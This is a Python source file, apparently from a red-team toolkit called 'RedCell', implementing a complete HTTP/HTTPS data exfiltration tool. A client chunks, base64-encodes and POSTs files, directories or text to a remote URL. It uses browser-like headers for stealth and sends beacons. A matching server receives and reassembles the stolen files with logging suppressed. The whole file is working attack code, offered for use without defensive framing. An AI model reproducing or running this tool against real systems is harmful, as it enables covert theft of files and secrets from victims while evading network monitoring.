"""
HTTP/HTTPS Exfiltration Module

Exfiltrate data over HTTP/HTTPS channels.
"""

import requests
import os
import base64
import time
from typing import Optional, Dict, List
from dataclasses import dataclass, asdict
import json
from pathlib import Path


@dataclass
class ExfilSession:
    """Represents an exfiltration session."""

    session_id: str
    target_url: str
    files_sent: int = 0
    bytes_sent: int = 0
    chunks_sent: int = 0
    start_time: Optional[str] = None
    status: str = "active"  # active, completed, failed

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return asdict(self)


class HTTPExfiltration:
    """
    HTTP/HTTPS data exfiltration.

    Features:
    - File chunking for large files
    - Base64 encoding
    - Custom headers for stealth
    - Progress tracking
    - Resume capability
    - Rate limiting
    """

    def __init__(
        self,
        target_url: str,
        session_id: str = None,
        chunk_size: int = 1024 * 1024,  # 1MB chunks
        headers: Dict = None,
        verify_ssl: bool = True,
        timeout: int = 30
    ):
        """
        Initialize HTTP exfiltration.

        Args:
            target_url: Target URL for exfiltration
            session_id: Session identifier (generated if not provided)
            chunk_size: Size of chunks in bytes
            headers: Custom HTTP headers
            verify_ssl: Verify SSL certificates
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.session_id = session_id or self._generate_session_id()
        self.chunk_size = chunk_size
        self.verify_ssl = verify_ssl
        self.timeout = timeout

        # Default headers to look like normal traffic
        self.headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json'
        }

        self.session = ExfilSession(
            session_id=self.session_id,
            target_url=target_url,
            start_time=time.strftime('%Y-%m-%d %H:%M:%S')
        )

    def _generate_session_id(self) -> str:
        """Generate unique session ID."""
        import uuid
        return str(uuid.uuid4())[:8]

    def exfiltrate_file(
        self,
        file_path: str,
        metadata: Dict = None,
        rate_limit: float = 0
    ) -> bool:
        """
        Exfiltrate a single file.

        Args:
            file_path: Path to file
            metadata: Optional metadata about the file
            rate_limit: Delay between chunks in seconds

        Returns:
            True if successful
        """
        if not os.path.exists(file_path):
            print(f"[-] File not found: {file_path}")
            return False

        print(f"[*] Exfiltrating: {file_path}")

        file_size = os.path.getsize(file_path)
        filename = os.path.basename(file_path)

        # Calculate number of chunks
        num_chunks = (file_size + self.chunk_size - 1) // self.chunk_size

        print(f"[*] File size: {file_size / (1024*1024):.2f} MB")
        print(f"[*] Chunks: {num_chunks}")

        try:
            with open(file_path, 'rb') as f:
                chunk_index = 0

                while True:
                    chunk_data = f.read(self.chunk_size)

                    if not chunk_data:
                        break

                    # Send chunk
                    success = self._send_chunk(
                        filename=filename,
                        chunk_data=chunk_data,
                        chunk_index=chunk_index,
                        total_chunks=num_chunks,
                        metadata=metadata
                    )

                    if not success:
                        print(f"[-] Failed to send chunk {chunk_index}")
                        return False

                    chunk_index += 1
                    self.session.chunks_sent += 1
                    self.session.bytes_sent += len(chunk_data)

                    # Progress
                    progress = (chunk_index / num_chunks) * 100
                    print(f"[*] Progress: {progress:.1f}% ({chunk_index}/{num_chunks})")

                    # Rate limiting
                    if rate_limit > 0:
                        time.sleep(rate_limit)

            self.session.files_sent += 1
            print(f"[+] Successfully exfiltrated: {file_path}")
            return True

        except Exception as e:
            print(f"[-] Error exfiltrating file: {e}")
            return False

    def _send_chunk(
        self,
        filename: str,
        chunk_data: bytes,
        chunk_index: int,
        total_chunks: int,
        metadata: Dict = None
    ) -> bool:
        """
        Send a single chunk.

        Args:
            filename: Original filename
            chunk_data: Chunk data
            chunk_index: Current chunk index
            total_chunks: Total number of chunks
            metadata: Optional metadata

        Returns:
            True if successful
        """
        try:
            # Encode chunk
            encoded_data = base64.b64encode(chunk_data).decode('utf-8')

            # Prepare payload
            payload = {
                'session_id': self.session_id,
                'filename': filename,
                'chunk_index': chunk_index,
                'total_chunks': total_chunks,
                'data': encoded_data,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }

            if metadata:
                payload['metadata'] = metadata

            # Send POST request
            response = requests.post(
                self.target_url,
                json=payload,
                headers=self.headers,
                verify=self.verify_ssl,
                timeout=self.timeout
            )

            if response.status_code == 200:
                return True
            else:
                print(f"[-] Server returned status code: {response.status_code}")
                return False

        except requests.exceptions.Timeout:
            print(f"[-] Request timeout")
            return False
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error")
            return False
        except Exception as e:
            print(f"[-] Error sending chunk: {e}")
            return False

    def exfiltrate_text(
        self,
        data: str,
        filename: str = "data.txt",
        metadata: Dict = None
    ) -> bool:
        """
        Exfiltrate text data.

        Args:
            data: Text data to exfiltrate
            filename: Filename for the data
            metadata: Optional metadata

        Returns:
            True if successful
        """
        try:
            encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

            payload = {
                'session_id': self.session_id,
                'filename': filename,
                'chunk_index': 0,
                'total_chunks': 1,
                'data': encoded_data,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }

            if metadata:
                payload['metadata'] = metadata

            response = requests.post(
                self.target_url,
                json=payload,
                headers=self.headers,
                verify=self.verify_ssl,
                timeout=self.timeout
            )

            if response.status_code == 200:
                self.session.files_sent += 1
                self.session.bytes_sent += len(data)
                print(f"[+] Successfully exfiltrated text data: {filename}")
                return True
            else:
                print(f"[-] Server returned status code: {response.status_code}")
                return False

        except Exception as e:
            print(f"[-] Error exfiltrating text: {e}")
            return False

    def exfiltrate_directory(
        self,
        directory: str,
        rate_limit: float = 0,
        recursive: bool = True
    ) -> Dict:
        """
        Exfiltrate entire directory.

        Args:
            directory: Directory path
            rate_limit: Delay between files in seconds
            recursive: Include subdirectories

        Returns:
            Statistics dictionary
        """
        if not os.path.isdir(directory):
            print(f"[-] Directory not found: {directory}")
            return {'success': False}

        print(f"[*] Exfiltrating directory: {directory}")

        files_succeeded = 0
        files_failed = 0

        if recursive:
            for root, dirs, files in os.walk(directory):
                for filename in files:
                    file_path = os.path.join(root, filename)

                    # Calculate relative path
                    rel_path = os.path.relpath(file_path, directory)

                    metadata = {
                        'original_path': file_path,
                        'relative_path': rel_path
                    }

                    if self.exfiltrate_file(file_path, metadata=metadata, rate_limit=rate_limit):
                        files_succeeded += 1
                    else:
                        files_failed += 1

        else:
            for filename in os.listdir(directory):
                file_path = os.path.join(directory, filename)

                if os.path.isfile(file_path):
                    if self.exfiltrate_file(file_path, rate_limit=rate_limit):
                        files_succeeded += 1
                    else:
                        files_failed += 1

        print(f"\n[+] Directory exfiltration complete")
        print(f"    Files succeeded: {files_succeeded}")
        print(f"    Files failed: {files_failed}")

        return {
            'success': True,
            'files_succeeded': files_succeeded,
            'files_failed': files_failed,
            'total_bytes': self.session.bytes_sent
        }

    def send_beacon(self, status: str = "active") -> bool:
        """
        Send beacon to indicate session is active.

        Args:
            status: Session status

        Returns:
            True if successful
        """
        try:
            payload = {
                'session_id': self.session_id,
                'type': 'beacon',
                'status': status,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'stats': {
                    'files_sent': self.session.files_sent,
                    'bytes_sent': self.session.bytes_sent,
                    'chunks_sent': self.session.chunks_sent
                }
            }

            response = requests.post(
                self.target_url,
                json=payload,
                headers=self.headers,
                verify=self.verify_ssl,
                timeout=self.timeout
            )

            return response.status_code == 200

        except Exception:
            return False

    def get_stats(self) -> Dict:
        """
        Get exfiltration statistics.

        Returns:
            Statistics dictionary
        """
        return {
            'session_id': self.session.session_id,
            'files_sent': self.session.files_sent,
            'bytes_sent': self.session.bytes_sent,
            'mb_sent': self.session.bytes_sent / (1024 * 1024),
            'chunks_sent': self.session.chunks_sent,
            'start_time': self.session.start_time,
            'target_url': self.target_url
        }

    def generate_report(self) -> str:
        """
        Generate exfiltration report.

        Returns:
            Formatted report string
        """
        stats = self.get_stats()

        report = []
        report.append("=" * 80)
        report.append("HTTP EXFILTRATION REPORT")
        report.append("=" * 80)
        report.append(f"\nSession ID: {stats['session_id']}")
        report.append(f"Target URL: {stats['target_url']}")
        report.append(f"Start Time: {stats['start_time']}")
        report.append(f"\nFiles Sent: {stats['files_sent']}")
        report.append(f"Data Sent: {stats['mb_sent']:.2f} MB")
        report.append(f"Chunks Sent: {stats['chunks_sent']}")
        report.append("=" * 80)

        return "\n".join(report)


def create_exfil_server(port: int = 8000):
    """
    Create simple HTTP server to receive exfiltrated data.

    Args:
        port: Port to listen on
    """
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import json

    class ExfilHandler(BaseHTTPRequestHandler):
        """Handler for receiving exfiltrated data."""

        def do_POST(self):
            """Handle POST requests."""
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)

            try:
                data = json.loads(post_data.decode('utf-8'))

                # Check if it's a beacon
                if data.get('type') == 'beacon':
                    print(f"[*] Beacon from session {data['session_id']}: {data['status']}")
                    self.send_response(200)
                    self.end_headers()
                    return

                # Handle file chunk
                session_id = data.get('session_id')
                filename = data.get('filename')
                chunk_index = data.get('chunk_index')
                total_chunks = data.get('total_chunks')
                chunk_data = data.get('data')

                print(f"[+] Received chunk {chunk_index + 1}/{total_chunks} of {filename} from session {session_id}")

                # Decode and save chunk
                decoded_data = base64.b64decode(chunk_data)

                # Create output directory
                output_dir = f"exfil_{session_id}"
                os.makedirs(output_dir, exist_ok=True)

                # Save chunk
                chunk_filename = f"{output_dir}/{filename}.part{chunk_index}"

                with open(chunk_filename, 'wb') as f:
                    f.write(decoded_data)

                # If last chunk, reassemble file
                if chunk_index == total_chunks - 1:
                    output_file = f"{output_dir}/{filename}"

                    with open(output_file, 'wb') as outfile:
                        for i in range(total_chunks):
                            chunk_file = f"{output_dir}/{filename}.part{i}"
                            with open(chunk_file, 'rb') as infile:
                                outfile.write(infile.read())
                            # Clean up chunk file
                            os.remove(chunk_file)

                    print(f"[+] File reassembled: {output_file}")

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')

            except Exception as e:
                print(f"[-] Error: {e}")
                self.send_response(500)
                self.end_headers()

        def log_message(self, format, *args):
            """Suppress default logging."""
            pass

    server = HTTPServer(('0.0.0.0', port), ExfilHandler)
    print(f"[*] Exfiltration server listening on port {port}")
    print(f"[*] Press Ctrl+C to stop")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell HTTP Exfiltration')

    subparsers = parser.add_subparsers(dest='mode', help='Mode')

    # Client mode
    client_parser = subparsers.add_parser('client', help='Exfiltrate data')
    client_parser.add_argument('--url', required=True, help='Target URL')
    client_parser.add_argument('--file', help='File to exfiltrate')
    client_parser.add_argument('--dir', help='Directory to exfiltrate')
    client_parser.add_argument('--text', help='Text data to exfiltrate')
    client_parser.add_argument('--chunk-size', type=int, default=1024*1024, help='Chunk size in bytes')
    client_parser.add_argument('--rate-limit', type=float, default=0, help='Delay between chunks/files')
    client_parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL verification')

    # Server mode
    server_parser = subparsers.add_parser('server', help='Run exfiltration server')
    server_parser.add_argument('--port', type=int, default=8000, help='Port to listen on')

    args = parser.parse_args()

    if args.mode == 'server':
        create_exfil_server(port=args.port)

    elif args.mode == 'client':
        exfil = HTTPExfiltration(
            target_url=args.url,
            chunk_size=args.chunk_size,
            verify_ssl=not args.no_verify_ssl
        )

        if args.file:
            exfil.exfiltrate_file(args.file, rate_limit=args.rate_limit)

        elif args.dir:
            exfil.exfiltrate_directory(args.dir, rate_limit=args.rate_limit)

        elif args.text:
            exfil.exfiltrate_text(args.text)

        else:
            print("[-] Specify --file, --dir, or --text")
            return

        # Print report
        print("\n")
        print(exfil.generate_report())

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
